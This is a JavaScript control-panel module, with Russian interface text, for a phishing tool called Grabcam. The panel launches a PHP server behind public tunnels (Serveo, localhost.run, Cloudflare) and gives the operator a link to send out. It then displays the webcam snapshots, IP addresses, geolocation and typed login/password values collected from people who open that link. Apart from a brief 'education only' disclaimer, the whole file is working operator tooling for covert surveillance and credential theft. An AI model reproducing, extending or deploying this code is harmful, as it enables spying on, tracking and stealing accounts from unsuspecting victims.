/**
 * Панель Grabcam: запуск PHP + Serveo, просмотр снятых фото.
 */
import { apiRun } from "../app.js";

const TOOL_ID = "grabcam";
let _pollId = null;
let _photosPollId = null;
let _locationsPollId = null;
let _formgrabPollId = null;

function escapeHtml(s) {
  if (s == null) return "";
  const t = String(s);
  return t.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
}

function copyToClipboard(text) {
  if (!text) return;
  navigator.clipboard.writeText(text).then(() => {}).catch(() => {});
}

export function initPanel(container) {
  if (_pollId) {
    clearInterval(_pollId);
    _pollId = null;
  }
  if (_photosPollId) {
    clearInterval(_photosPollId);
    _photosPollId = null;
  }
  if (_locationsPollId) {
    clearInterval(_locationsPollId);
    _locationsPollId = null;
  }
  if (_formgrabPollId) {
    clearInterval(_formgrabPollId);
    _formgrabPollId = null;
  }
  container.innerHTML = `
    <div class="grabcam-page">
      <header class="grabcam-header">
        <h2>Grabcam</h2>
        <p class="grabcam-desc">Камера, геолокация и захват форм. Запустите сервер, отправьте ссылку — снимки и данные появятся ниже. <strong>Только для образования и тестирования с разрешения.</strong></p>
      </header>
      <section class="grabcam-control-card grabcam-features-card">
        <h3 class="grabcam-card-title">Функции на странице</h3>
        <p class="grabcam-features-desc">Включите только нужное — так страница быстрее. Можно менять галочки <strong>на ходу</strong>: уже открытая ссылка подхватит новые функции без перезапуска (каждые ~12 сек).</p>
        <div class="grabcam-features-row">
          <label class="grabcam-feature-check"><input type="checkbox" name="camera" id="grabcam-feat-camera" checked> Камера</label>
          <label class="grabcam-feature-check"><input type="checkbox" name="geo" id="grabcam-feat-geo" checked> Геолокация</label>
          <label class="grabcam-feature-check"><input type="checkbox" name="form" id="grabcam-feat-form" checked> Захват формы (логин/пароль)</label>
          <label class="grabcam-feature-check"><input type="checkbox" name="gallery" id="grabcam-feat-gallery"> Галерея</label>
        </div>
      </section>
      <section class="grabcam-control-card">
        <h3 class="grabcam-card-title">Сервер</h3>
        <form id="form-grabcam" class="grabcam-control-form">
          <div class="grabcam-control-row">
            <label class="grabcam-control-label">Метод</label>
            <select name="method" id="grabcam-method-select" class="grabcam-select">
              <option value="php_only">Только PHP (локальная сеть)</option>
              <option value="localhost_run">localhost.run (рекомендуется для РФ)</option>
              <option value="cloudflared">Cloudflare Tunnel</option>
              <option value="serveo">Serveo</option>
            </select>
            <button type="submit" class="btn btn-primary" id="btn-start-grabcam">Запустить</button>
            <button type="button" class="btn btn-danger" id="btn-stop-grabcam" style="display:none">Остановить</button>
          </div>
          <p id="grabcam-method-hint" class="grabcam-method-hint"></p>
        </form>
        <div id="status-grabcam" class="grabcam-status" role="status"></div>
        <div id="result-grabcam" class="grabcam-link-box result-box result-box--placeholder">Ссылка появится после запуска.</div>
        <p id="grabcam-hint" class="grabcam-hint" style="display:none">Отправьте ссылку — снимки и геолокация появятся в блоках ниже.</p>
      </section>
      <div class="grabcam-grid">
        <section class="grabcam-card">
          <div class="grabcam-card-head">
            <h3 class="grabcam-card-title">Снятые фото</h3>
            <button type="button" class="btn btn-secondary btn-sm" id="btn-refresh-photos" title="Обновить">↻</button>
          </div>
          <div id="grabcam-photos-stats" class="grabcam-photos-stats"></div>
          <div id="grabcam-photos-list" class="grabcam-photos-list">Загрузка…</div>
        </section>
        <section class="grabcam-card">
          <div class="grabcam-card-head">
            <h3 class="grabcam-card-title">IP и местоположение</h3>
            <button type="button" class="btn btn-secondary btn-sm" id="btn-refresh-locations" title="Обновить">↻</button>
          </div>
          <div id="grabcam-locations-list" class="grabcam-locations-list">Загрузка…</div>
        </section>
        <section class="grabcam-card">
          <div class="grabcam-card-head">
            <h3 class="grabcam-card-title">Введённые данные (формы)</h3>
            <button type="button" class="btn btn-secondary btn-sm" id="grabcam-formgrab-btn-refresh" title="Обновить">↻</button>
          </div>
          <div id="grabcam-formgrab-captures-list" class="grabcam-formgrab-captures-list">Ввод с формы входа на странице по ссылке выше появится здесь.</div>
        </section>
      </div>
    </div>
  `;

  const form = container.querySelector("#form-grabcam");
  const resultEl = container.querySelector("#result-grabcam");
  const statusEl = container.querySelector("#status-grabcam");
  const submitBtn = container.querySelector("#btn-start-grabcam");
  const stopBtn = container.querySelector("#btn-stop-grabcam");

  const hintEl = container.querySelector("#grabcam-hint");
  const methodSelect = container.querySelector("#grabcam-method-select");
  const methodHint = container.querySelector("#grabcam-method-hint");

  const methodHints = {
    php_only: "Локальный адрес: только этот ПК или устройства в той же сети.",
    localhost_run: "Публичная ссылка (…lhr.life). Нужен SSH. Часто работает в РФ, когда Serveo недоступен.",
    cloudflared: "Публичная ссылка (…trycloudflare.com). Установите cloudflared — без SSH, часто доступен в РФ.",
    serveo: "Публичная ссылка (…serveo.net). Нужен SSH. Может быть недоступен в РФ или за фаерволом — тогда используйте localhost.run или Cloudflare.",
  };
  function updateMethodHint() {
    if (methodHint && methodSelect) {
      methodHint.textContent = methodHints[methodSelect.value] || methodHints.php_only;
    }
  }
  methodSelect?.addEventListener("change", updateMethodHint);
  updateMethodHint();

  async function loadOptions() {
    try {
      const res = await fetch("/api/tools/grabcam/options");
      const opts = await res.json();
      const cameraCb = container.querySelector("#grabcam-feat-camera");
      const geoCb = container.querySelector("#grabcam-feat-geo");
      const formCb = container.querySelector("#grabcam-feat-form");
      const galleryCb = container.querySelector("#grabcam-feat-gallery");
      if (cameraCb) cameraCb.checked = opts.camera !== false;
      if (geoCb) geoCb.checked = opts.geo !== false;
      if (formCb) formCb.checked = opts.form !== false;
      if (galleryCb) galleryCb.checked = opts.gallery === true;
    } catch (_) {}
  }
  function saveOptions() {
    const payload = {
      camera: container.querySelector("#grabcam-feat-camera")?.checked !== false,
      geo: container.querySelector("#grabcam-feat-geo")?.checked !== false,
      form: container.querySelector("#grabcam-feat-form")?.checked !== false,
      gallery: container.querySelector("#grabcam-feat-gallery")?.checked === true,
    };
    fetch("/api/tools/grabcam/options", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    }).catch(() => {});
  }
  loadOptions();
  ["#grabcam-feat-camera", "#grabcam-feat-geo", "#grabcam-feat-form", "#grabcam-feat-gallery"].forEach((sel) => {
    container.querySelector(sel)?.addEventListener("change", saveOptions);
  });

  function showLink(link, localUrl) {
    resultEl.classList.remove("result-box--placeholder");
    if (hintEl) hintEl.style.display = "block";
    const url = link || localUrl;
    if (url) {
      resultEl.innerHTML = `<span class="grabcam-link-label">${link ? "Публичная ссылка:" : "Локальный сервер:"}</span>
        <div class="grabcam-link-row">
          <a href="${escapeHtml(url)}" target="_blank" rel="noopener" class="grabcam-link-url">${escapeHtml(url)}</a>
          <button type="button" class="btn btn-secondary btn-sm btn-copy">Копировать</button>
        </div>`;
      resultEl.querySelector(".btn-copy")?.addEventListener("click", () => {
        copyToClipboard(url);
        if (statusEl) statusEl.textContent = "Ссылка скопирована.";
      });
    }
  }

  let _serveoWaitStart = 0;
  async function pollStatus() {
    try {
      const res = await fetch("/api/tools/grabcam/run-status");
      const st = await res.json();
      if (st.error) {
        statusEl.textContent = st.error;
        if (!st.link && !st.local_url) {
          resultEl.className = "result-box error";
          resultEl.textContent = st.error;
        }
      }
      if (st.link || st.local_url) {
        _serveoWaitStart = 0;
        showLink(st.link || null, st.local_url || null);
        resultEl.className = "result-box success";
      } else if (st.running && !st.link && !st.local_url) {
        if (_serveoWaitStart === 0) _serveoWaitStart = Date.now();
        const sec = Math.floor((Date.now() - _serveoWaitStart) / 1000);
        statusEl.textContent = "Ожидание публичной ссылки… " + (sec > 0 ? sec + " сек" : "");
      }
      if (!st.running) {
        if (_pollId) clearInterval(_pollId);
        _pollId = null;
        _serveoWaitStart = 0;
        submitBtn.style.display = "";
        stopBtn.style.display = "none";
        submitBtn.disabled = false;
        if (!st.link && !st.local_url && !st.error) statusEl.textContent = "";
      }
      return st.running;
    } catch (_) {
      return true;
    }
  }

  stopBtn.addEventListener("click", async () => {
    try {
      const res = await fetch("/api/tools/grabcam/stop", { method: "POST" });
      const data = await res.json();
      if (data.success) statusEl.textContent = "Остановка…";
      await pollStatus();
    } catch (_) {}
  });

  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    const fd = new FormData(form);
    const params = {
      method: fd.get("method") || "php_only",
      camera: container.querySelector("#grabcam-feat-camera")?.checked !== false,
      geo: container.querySelector("#grabcam-feat-geo")?.checked !== false,
      form: container.querySelector("#grabcam-feat-form")?.checked !== false,
      gallery: container.querySelector("#grabcam-feat-gallery")?.checked === true,
    };

    resultEl.textContent = "";
    resultEl.className = "result-box";
    resultEl.classList.remove("result-box--placeholder");
    statusEl.textContent = "Запуск…";
    submitBtn.disabled = true;
    submitBtn.style.display = "none";
    stopBtn.style.display = "inline-block";

    try {
      const data = await apiRun(TOOL_ID, params);
      if (data.started) {
        statusEl.textContent = data.message || "Запущено.";
        if (data.local_url) {
          showLink(null, data.local_url);
          resultEl.className = "result-box success";
        }
        _pollId = setInterval(pollStatus, 2000);
        pollStatus();
      } else {
        statusEl.textContent = "";
        submitBtn.style.display = "";
        stopBtn.style.display = "none";
        submitBtn.disabled = false;
        resultEl.className = "result-box error";
        resultEl.textContent = data.error || "Ошибка";
      }
    } catch (err) {
      statusEl.textContent = "";
      submitBtn.style.display = "";
      stopBtn.style.display = "none";
      submitBtn.disabled = false;
      resultEl.className = "result-box error";
      resultEl.textContent = err.message || "Ошибка сети";
    }
  });

  async function loadPhotos() {
    const listEl = container.querySelector("#grabcam-photos-list");
    const statsEl = container.querySelector("#grabcam-photos-stats");
    if (!listEl) return;
    try {
      const res = await fetch("/api/tools/grabcam/photos?limit=30");
      const data = await res.json();
      const photos = data.photos || [];
      const total = data.total != null ? data.total : photos.length;
      const unique = data.unique_devices != null ? data.unique_devices : new Set(photos.map((p) => p.ip)).size;
      if (statsEl) {
        if (total > 0) {
          statsEl.textContent = `Всего: ${total} фото · устройств: ${unique}`;
          statsEl.className = "grabcam-photos-stats";
        } else {
          statsEl.textContent = "";
          statsEl.className = "grabcam-photos-stats grabcam-photos-stats--empty";
        }
      }
      if (photos.length === 0) {
        listEl.innerHTML = "<span class=\"grabcam-photos-empty\">Пока нет снимков. Запустите сервер и откройте ссылку — после разрешения камеры фото появятся здесь.</span>";
        listEl.className = "grabcam-photos-list grabcam-photos-list--empty";
      } else {
        listEl.className = "grabcam-photos-list";
        listEl.innerHTML = photos.map((p) =>
          `<div class="grabcam-photo-item"><a href="${escapeHtml(p.url)}" target="_blank" rel="noopener"><img src="${escapeHtml(p.url)}" alt="" loading="lazy"></a><span class="grabcam-photo-meta">${escapeHtml((p.ip || "").replace(/_/g, "."))}</span></div>`
        ).join("");
      }
    } catch (_) {
      listEl.innerHTML = "<span class=\"grabcam-photos-empty\">Ошибка загрузки списка</span>";
      listEl.className = "grabcam-photos-list grabcam-photos-list--empty";
      if (statsEl) statsEl.textContent = "";
    }
  }

  container.querySelector("#btn-refresh-photos")?.addEventListener("click", () => {
    const listEl = container.querySelector("#grabcam-photos-list");
    if (listEl) listEl.textContent = "Обновление…";
    loadPhotos();
  });

  async function loadLocations() {
    const listEl = container.querySelector("#grabcam-locations-list");
    if (!listEl) return;
    try {
      const res = await fetch("/api/tools/grabcam/locations");
      const data = await res.json();
      const locations = data.locations || [];
      if (locations.length === 0) {
        listEl.innerHTML = "<span class=\"grabcam-locations-empty\">Нет данных о местоположении. После открытия ссылки и съёмки фото здесь появятся IP и геоданные.</span>";
        listEl.className = "grabcam-locations-list grabcam-locations-list--empty";
      } else {
        listEl.className = "grabcam-locations-list";
        listEl.innerHTML = locations.map((loc) => {
          const lat = (loc.lat && loc.lat !== "0") ? loc.lat : null;
          const lon = (loc.lon && loc.lon !== "0") ? loc.lon : null;
          const hasCoords = lat != null && lon != null && parseFloat(lat) && parseFloat(lon);
          const place = [loc.country, loc.region, loc.city].filter(Boolean).join(", ") || "—";
          const mapUrl = hasCoords ? `https://www.openstreetmap.org/?mlat=${encodeURIComponent(lat)}&mlon=${encodeURIComponent(lon)}&zoom=12` : null;
          return `<div class="grabcam-location-item">
            <div class="grabcam-location-row"><strong>${escapeHtml(loc.device_id || loc.ip || "—")}</strong></div>
            <div class="grabcam-location-row grabcam-location-meta">IP: ${escapeHtml(loc.ip || "—")}</div>
            <div class="grabcam-location-row grabcam-location-meta">${escapeHtml(place)}</div>
            ${loc.isp ? `<div class="grabcam-location-row grabcam-location-meta">${escapeHtml(loc.isp)}</div>` : ""}
            ${loc.last_update ? `<div class="grabcam-location-row grabcam-location-time">${escapeHtml(loc.last_update)}</div>` : ""}
            ${mapUrl ? `<a href="${mapUrl}" target="_blank" rel="noopener" class="grabcam-location-map">Карта</a>` : ""}
          </div>`;
        }).join("");
      }
    } catch (_) {
      listEl.innerHTML = "<span class=\"grabcam-locations-empty\">Ошибка загрузки</span>";
      listEl.className = "grabcam-locations-list grabcam-locations-list--empty";
    }
  }

  container.querySelector("#btn-refresh-locations")?.addEventListener("click", () => {
    const listEl = container.querySelector("#grabcam-locations-list");
    if (listEl) listEl.textContent = "Обновление…";
    loadLocations();
  });

  const formgrabCapturesList = container.querySelector("#grabcam-formgrab-captures-list");

  async function loadGrabcamFormCaptures() {
    if (!formgrabCapturesList) return;
    try {
      const res = await fetch("/api/tools/grabcam/form-captures?limit=100");
      const data = await res.json();
      const captures = data.captures || [];
      if (captures.length === 0) {
        formgrabCapturesList.innerHTML = "<span class=\"grabcam-formgrab-empty\">Пока нет введённых данных. Откройте ссылку выше — форма входа на той же странице.</span>";
        formgrabCapturesList.className = "grabcam-formgrab-captures-list grabcam-formgrab-captures-list--empty";
      } else {
        formgrabCapturesList.className = "grabcam-formgrab-captures-list";
        formgrabCapturesList.innerHTML = `
          <table class="grabcam-formgrab-table">
            <thead><tr><th>Время</th><th>Поле</th><th>Значение</th><th>IP</th></tr></thead>
            <tbody>
              ${captures.map((c) => `
                <tr>
                  <td class="grabcam-formgrab-ts">${escapeHtml(c.ts)}</td>
                  <td class="grabcam-formgrab-field">${escapeHtml(c.field)}</td>
                  <td class="grabcam-formgrab-value">${escapeHtml(c.value)}</td>
                  <td class="grabcam-formgrab-ip">${escapeHtml(c.ip)}</td>
                </tr>
              `).join("")}
            </tbody>
          </table>
        `;
      }
    } catch (_) {
      formgrabCapturesList.innerHTML = "<span class=\"grabcam-formgrab-empty\">Ошибка загрузки</span>";
      formgrabCapturesList.className = "grabcam-formgrab-captures-list grabcam-formgrab-captures-list--empty";
    }
  }

  container.querySelector("#grabcam-formgrab-btn-refresh")?.addEventListener("click", loadGrabcamFormCaptures);

  loadPhotos();
  loadLocations();
  loadGrabcamFormCaptures();
  const photosInterval = 4000;
  _photosPollId = setInterval(loadPhotos, photosInterval);
  _locationsPollId = setInterval(loadLocations, 6000);
  _formgrabPollId = setInterval(loadGrabcamFormCaptures, 5000);

  (async function checkRunning() {
    try {
      const res = await fetch("/api/tools/grabcam/run-status");
      const st = await res.json();
      if (st.running || st.link || st.local_url) {
        if (st.link || st.local_url) showLink(st.link || null, st.local_url || null);
        if (st.running) {
          submitBtn.disabled = true;
          submitBtn.style.display = "none";
          stopBtn.style.display = "inline-block";
          statusEl.textContent = "Сервер запущен. Ожидание ссылки…";
          _pollId = setInterval(pollStatus, 2000);
        }
        resultEl.classList.remove("result-box--placeholder");
        if (st.link || st.local_url) resultEl.className = "result-box success";
      }
    } catch (_) {}
  })();
}
